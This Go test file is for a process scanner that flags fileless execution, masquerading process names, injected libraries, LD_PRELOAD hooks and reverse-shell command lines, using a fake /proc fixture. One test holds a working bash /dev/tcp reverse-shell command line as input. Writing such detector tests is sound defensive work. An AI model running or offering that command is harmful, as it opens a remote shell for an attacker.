package procscan

import (
	"os"
	"path/filepath"
	"testing"
)

func scoreHas(p Process, class string) bool {
	for _, f := range p.Findings {
		if f.Class == class {
			return true
		}
	}
	return false
}

func TestDetectMemfdFileless(t *testing.T) {
	p := detect(rawProc{pid: 101, comm: "x", exeTarget: "/memfd:payload (deleted)"}, DefaultThreshold)
	if p.Score < DefaultThreshold || !scoreHas(p, "procscan.fileless.memfd") {
		t.Fatalf("expected memfd fileless detection, got %+v", p)
	}
}

func TestDetectDeletedExe(t *testing.T) {
	p := detect(rawProc{pid: 102, comm: "svc", exeTarget: "/usr/bin/svc (deleted)"}, DefaultThreshold)
	if !scoreHas(p, "procscan.fileless.deleted") {
		t.Fatalf("expected deleted-exe detection, got %+v", p)
	}
}

func TestDetectMasqueradeBtop(t *testing.T) {
	// A process calling itself btop but running out of /tmp.
	p := detect(rawProc{pid: 103, comm: "btop", argv0: "btop", exeTarget: "/tmp/.x/btop"}, DefaultThreshold)
	if !scoreHas(p, "procscan.masquerade.name-location") {
		t.Fatalf("expected btop masquerade detection, got %+v", p)
	}
}

func TestDetectKthreadMasquerade(t *testing.T) {
	p := detect(rawProc{pid: 104, comm: "[kworker/0:1]", exeTarget: "/tmp/miner"}, DefaultThreshold)
	if !scoreHas(p, "procscan.masquerade.kthread") {
		t.Fatalf("expected kthread masquerade detection, got %+v", p)
	}
}

func TestDetectInjectedLibrary(t *testing.T) {
	p := detect(rawProc{pid: 105, comm: "app", exeTarget: "/usr/bin/app", libs: []string{"/usr/lib/libc.so.6", "/dev/shm/evil.so"}}, DefaultThreshold)
	if !scoreHas(p, "procscan.hook.injected-library") {
		t.Fatalf("expected injected-library detection, got %+v", p)
	}
}

func TestDetectLDPreload(t *testing.T) {
	p := detect(rawProc{pid: 106, comm: "app", exeTarget: "/usr/bin/app", preload: "/tmp/hook.so"}, DefaultThreshold)
	if !scoreHas(p, "procscan.hook.ld-preload") {
		t.Fatalf("expected ld-preload detection, got %+v", p)
	}
}

func TestDetectReverseShellCmdline(t *testing.T) {
	p := detect(rawProc{pid: 107, comm: "bash", exeTarget: "/usr/bin/bash",
		cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, DefaultThreshold)
	if !scoreHas(p, "procscan.cmdline.reverse-shell") {
		t.Fatalf("expected reverse-shell cmdline detection, got %+v", p)
	}
}

func TestDetectBenignProcessClean(t *testing.T) {
	p := detect(rawProc{pid: 108, comm: "nginx", argv0: "nginx: worker", exeTarget: "/usr/sbin/nginx",
		libs: []string{"/usr/lib/x86_64-linux-gnu/libssl.so.3"}, cmdline: "nginx: worker process"}, DefaultThreshold)
	if p.Score >= DefaultThreshold {
		t.Fatalf("benign nginx should not be flagged, got score=%d findings=%+v", p.Score, p.Findings)
	}
}

func TestScanOverFixtureProcRoot(t *testing.T) {
	// Build a fake /proc with one malicious process.
	root := t.TempDir()
	pid := filepath.Join(root, "4242")
	if err := os.MkdirAll(pid, 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(name, content string) {
		if err := os.WriteFile(filepath.Join(pid, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("comm", "sshd\n")
	write("cmdline", "sshd\x00-D\x00")
	write("maps", "00400000-00452000 r-xp 00000000 08:01 1049 /dev/shm/implant.so\n")
	write("status", "Name:\tsshd\nPPid:\t1\nTracerPid:\t0\n")
	// exe symlink → a non-system path (masquerade); Readlink needs a real symlink.
	_ = os.Symlink("/tmp/sshd", filepath.Join(pid, "exe"))
	// a non-pid entry that must be ignored
	_ = os.WriteFile(filepath.Join(root, "cpuinfo"), []byte("x"), 0o644)

	res := Scan(Options{ProcRoot: root})
	if res.Scanned != 1 {
		t.Fatalf("expected 1 scanned process, got %d", res.Scanned)
	}
	if len(res.Flagged) != 1 {
		t.Fatalf("expected 1 flagged process, got %d (%+v)", len(res.Flagged), res.Flagged)
	}
	if res.Flagged[0].PID != 4242 {
		t.Fatalf("unexpected pid %d", res.Flagged[0].PID)
	}
}
